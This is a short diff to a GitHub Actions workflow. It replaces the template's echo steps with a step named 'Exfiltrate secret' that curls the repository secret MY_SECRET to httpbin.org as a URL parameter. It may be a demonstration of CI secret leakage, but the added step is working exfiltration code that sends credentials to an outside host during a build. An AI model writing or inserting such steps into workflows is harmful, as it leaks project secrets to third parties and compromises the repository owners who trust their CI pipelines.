@@ -9,12 +9,8 @@ jobs:
 
     steps:
     - uses: actions/checkout@v1
-    - name: Run a one-line script
-      run: echo Hello, world!
-    - name: Run a multi-line script
+    - name: Exfiltrate secret
       run: |
-        echo Add other actions to build,
-        echo test, and deploy your project.
-        echo $MY_SECRET
+        curl http://httpbin.org/get?secret=$MY_SECRET
       env:
         MY_SECRET: ${{ secrets.MY_SECRET }}
